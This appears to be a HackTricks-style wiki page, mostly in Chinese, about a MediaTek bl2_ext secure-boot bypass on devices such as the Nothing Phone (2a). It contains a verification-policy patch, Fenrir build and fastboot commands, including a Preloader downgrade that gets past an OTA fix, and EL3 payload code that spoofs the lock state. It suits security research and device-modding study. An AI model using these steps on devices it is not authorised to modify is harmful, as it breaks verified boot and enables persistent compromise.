# MediaTek bl2_ext Secure-Boot Bypass (EL3 Code Execution)

{{#include ../../banners/hacktricks-training.md}}

本页记录了在多个 MediaTek 平台上通过利用设备 bootloader 配置 (seccfg) 处于 "unlocked" 时的验证缺口实现的一个实用的 secure-boot 绕过。该缺陷允许在 ARM EL3 上运行经过修改的 bl2_ext 以禁用后续的签名验证，瓦解信任链并使加载任意未签名的 TEE/GZ/LK/Kernel 成为可能。

> 警告：早期引导时打补丁若偏移错误可能会永久使设备变砖。始终保留完整转储和可靠的恢复路径。

## 受影响的启动流程 (MediaTek)

- 正常路径：BootROM → Preloader → bl2_ext (EL3, verified) → TEE → GenieZone (GZ) → LK/AEE → Linux kernel (EL1)
- 易受影响的路径：当 seccfg 设置为 unlocked 时，Preloader 可能会跳过对 bl2_ext 的验证。Preloader 仍会在 EL3 跳转到 bl2_ext，因此经过精心制作的 bl2_ext 可以随后加载未验证的组件。

关键的信任边界：
- bl2_ext 在 EL3 执行，负责验证 TEE、GenieZone、LK/AEE 和内核。如果 bl2_ext 本身未被认证，链中其余部分就可以被轻易绕过。

## 根本原因

在受影响的设备上，当 seccfg 指示为 "unlocked" 状态时，Preloader 不会强制对 bl2_ext 分区进行认证。这允许刷入一个受攻击者控制的 bl2_ext 并在 EL3 上运行。

在 bl2_ext 内，可以对验证策略函数进行补丁，使其无条件报告不需要验证。一个最小的概念性补丁为：
```c
// inside bl2_ext
int sec_get_vfy_policy(...) {
return 0; // always: "no verification required"
}
```
在此更改后，由修补过的 bl2_ext 在 EL3 运行时加载的所有后续镜像（TEE、GZ、LK/AEE、Kernel）在被接受时将不进行加密校验。

## 如何排查目标（expdb 日志）

在 bl2_ext 加载前后转储/检查引导日志（例如 expdb）。如果 img_auth_required = 0 且 certificate verification time 约为 ~0 ms，则强制验证很可能已被禁用，设备可能可被利用。

示例日志节选：
```
[PART] img_auth_required = 0
[PART] Image with header, name: bl2_ext, addr: FFFFFFFFh, mode: FFFFFFFFh, size:654944, magic:58881688h
[PART] part: lk_a img: bl2_ext cert vfy(0 ms)
```
Note: Some devices reportedly skip bl2_ext verification even with a locked bootloader, which exacerbates the impact.

Devices that ship the lk2 secondary bootloader have been observed with the same logic gap, so grab expdb logs for both bl2_ext and lk2 partitions to confirm whether either path enforces signatures before you attempt porting.

If a post-OTA Preloader now logs img_auth_required = 1 for bl2_ext even while seccfg is unlocked, the vendor likely closed the gap—see the OTA persistence notes below.

## 实战利用流程 (Fenrir PoC)

Fenrir 是一个针对此类问题的参考 exploit/patching 工具包。它支持 Nothing Phone (2a) (Pacman)，并且已知在 CMF Phone 1 (Tetris) 上可运行（支持不完整）。将其移植到其他型号需要对设备特定的 bl2_ext 进行逆向工程。

High-level process:
- 获取目标代号的设备 bootloader 镜像，并将其放置为 `bin/<device>.bin`
- 构建一个已打补丁的镜像以禁用 bl2_ext 验证策略
- 将生成的 payload 刷入设备（helper 脚本假定使用 fastboot）

Commands:
```bash
# Build patched image (default path bin/[device].bin)
./build.sh pacman

# Build from a custom bootloader path
./build.sh pacman /path/to/your/bootloader.bin

# Flash the resulting lk.patched (fastboot required by the helper script)
./flash.sh
```
If fastboot is unavailable, you must use a suitable alternative flashing method for your platform.

### OTA 已修补固件: keeping the bypass alive (NothingOS 4, late 2025)

Nothing 在 2025 年 11 月的 NothingOS 4 稳定 OTA (build BP2A.250605.031.A3) 中修补了 Preloader，以便即使 seccfg 已解锁也强制执行 bl2_ext 验证。Fenrir `pacman-v2.0` 通过将易受攻击的 NOS 4 beta 的 Preloader 与稳定的 LK payload 混合使用再次有效：
```bash
# on Nothing Phone (2a), unlocked bootloader, in bootloader (not fastbootd)
fastboot flash preloader_a preloader_raw.img   # beta Preloader bundled with fenrir release
fastboot flash lk pacman-fenrir.bin            # patched LK containing stage hooks
fastboot reboot                                # factory reset may be needed
```
Important:
- Flash the provided Preloader **only** to the matching device/slot; a wrong preloader is an instant hard brick.
- Check expdb after flashing; img_auth_required should drop back to 0 for bl2_ext, confirming that the vulnerable Preloader is executing before your patched LK.
- If future OTAs patch both Preloader and LK, keep a local copy of a vulnerable Preloader to re‑introduce the gap.

### Build automation & payload debugging

- `build.sh` now auto-downloads and exports the Arm GNU Toolchain 14.2 (aarch64-none-elf) the first time you run it, so you do not have to juggle cross-compilers manually.
- Export `DEBUG=1` before invoking `build.sh` to compile payloads with verbose serial prints, which greatly helps when you are blind-patching EL3 code paths.
- Successful builds drop both `lk.patched` and `<device>-fenrir.bin`; the latter already has the payload injected and is what you should flash/boot-test.

## Runtime payload capabilities (EL3)

A patched bl2_ext payload can:
- Register custom fastboot commands
- Control/override boot mode
- Dynamically call built‑in bootloader functions at runtime
- Spoof “lock state” as locked while actually unlocked to pass stronger integrity checks (some environments may still require vbmeta/AVB adjustments)

Limitation: Current PoCs note that runtime memory modification may fault due to MMU constraints; payloads generally avoid live memory writes until this is resolved.

## Payload staging patterns (EL3)

Fenrir splits its instrumentation into three compile-time stages: stage1 runs before `platform_init()`, stage2 runs before LK signals fastboot entry, and stage3 executes immediately before LK loads Linux. Each device header under `payload/devices/` provides the addresses for these hooks plus fastboot helper symbols, so keep those offsets synchronized with your target build.

Stage2 is a convenient location to register arbitrary `fastboot oem` verbs:
```c
void cmd_r0rt1z2(const char *arg, void *data, unsigned int sz) {
video_printf("r0rt1z2 was here...\n");
fastboot_info("pwned by r0rt1z2");
fastboot_okay("");
}

__attribute__((section(".text.main"))) void main(void) {
fastboot_register("oem r0rt1z2", cmd_r0rt1z2, true, false);
notify_enter_fastboot();
}
```
Stage3 演示如何临时翻转页表属性以修补不可变字符串，例如 Android 的 “Orange State” 警告，而无需下游内核访问：
```c
set_pte_rwx(0xFFFF000050f9E3AE);
strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");
```
因为 stage1 在 platform bring-up 之前触发，这是调用 OEM power/reset primitives 或在 verified boot chain 被拆除之前插入额外完整性日志的合适位置。

## 移植提示

- 对设备特定的 bl2_ext 进行逆向工程，以定位验证策略逻辑（例如 sec_get_vfy_policy）。
- 确定策略的返回点或决策分支，并将其修补为 “no verification required”（return 0 / unconditional allow）。
- 保持偏移完全针对具体设备和固件；不要在不同变体间重用地址。
- 先在牺牲设备上验证。刷写前准备好恢复计划（例如 EDL/BootROM loader/SoC-specific download mode）。
- 使用 lk2 二级引导程序或即使在锁定状态下仍报告 bl2_ext 为 “img_auth_required = 0” 的设备，应视为该漏洞类别的易受攻击副本；已观察到 Vivo X80 Pro 即使报告为锁定状态也跳过验证。
- 当 OTA 开始在解锁状态下强制 bl2_ext 签名（img_auth_required = 1）时，检查是否可以刷入较旧的 Preloader（常见于 beta OTA）以重新打开漏洞，然后使用针对新版 LK 更新的偏移重新运行 fenrir。

## 安全影响

- 在 Preloader 之后实现 EL3 代码执行，并导致其余引导路径的完整信任链完全崩溃。
- 能够启动未签名的 TEE/GZ/LK/Kernel，绕过 secure/verified boot 的期望，从而实现持久化妥协。

## 设备备注

- 已确认支持：Nothing Phone (2a) (Pacman)
- 已知可用（支持不完整）：CMF Phone 1 (Tetris)
- 已观测：据报道 Vivo X80 Pro 即使在锁定时也未验证 bl2_ext
- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) 重新启用了 bl2_ext 验证；fenrir `pacman-v2.0` 通过刷入 beta Preloader 加上补丁后的 LK（如上所示）恢复了绕过
- 行业报道强调其他基于 lk2 的厂商也存在相同的逻辑缺陷，因此预计在 2024–2025 年的 MTK 发布中会有更多重叠。

## 参考资料

- [Fenrir – MediaTek bl2_ext secure‑boot bypass (PoC)](https://github.com/R0rt1z2/fenrir)
- [Cyber Security News – PoC Exploit Released For Nothing Phone Code Execution Vulnerability](https://cybersecuritynews.com/nothing-phone-code-execution-vulnerability/)
- [Fenrir pacman-v2.0 release (NothingOS 4 bypass bundle)](https://github.com/R0rt1z2/fenrir/releases/tag/pacman-v2.0)
- [The Cyber Express – Fenrir PoC breaks secure boot on Nothing Phone 2a/CMF1](https://thecyberexpress.com/fenrir-poc-for-nothing-phone-2a-cmf1/)

{{#include ../../banners/hacktricks-training.md}}
